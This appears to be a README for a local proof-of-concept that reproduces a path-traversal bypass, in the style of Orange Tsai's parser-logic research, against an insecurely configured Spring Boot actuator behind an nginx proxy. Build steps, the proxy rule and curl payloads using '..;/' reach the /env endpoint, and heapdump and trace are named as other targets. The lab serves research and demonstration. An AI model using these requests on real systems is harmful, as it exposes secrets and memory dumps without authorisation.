This is a PoC that combines Orange Tsais research about "Breaking parser logic" and an unsecure configuration of spring-boot-starter-actuator as documented in https://www.tutorialspoint.com/spring_boot/spring_boot_actuator.htm


1. cd spring; mvn clean install
2. cd target; java -jar orange-actuator-poc-0.0.1-SNAPSHOT.jar
3. test java service: `curl http://localhost:8080/api/hello`
4. install nginx and change nginx server listen port to 8081
5. add this to your nginx configuration to add a proxy rule:
```
	location /orange {
                proxy_pass http://localhost:8080/api;
                proxy_redirect     off;
                proxy_set_header   Host $host;
	}
```
6. start nginx
7. curl localhost:8081/orange/..;/env
8. curl localhost:8081/orange/directory/..;/..;/env

Nginx will send the request to the spring boot application at `http://localhost:8080/api/directory/..;/..;/env`
The path traversal makes that a request to `http://localhost:8080/env`
"env" can be substituted by any default actuaor endpoint, e.g. trace or heapdump
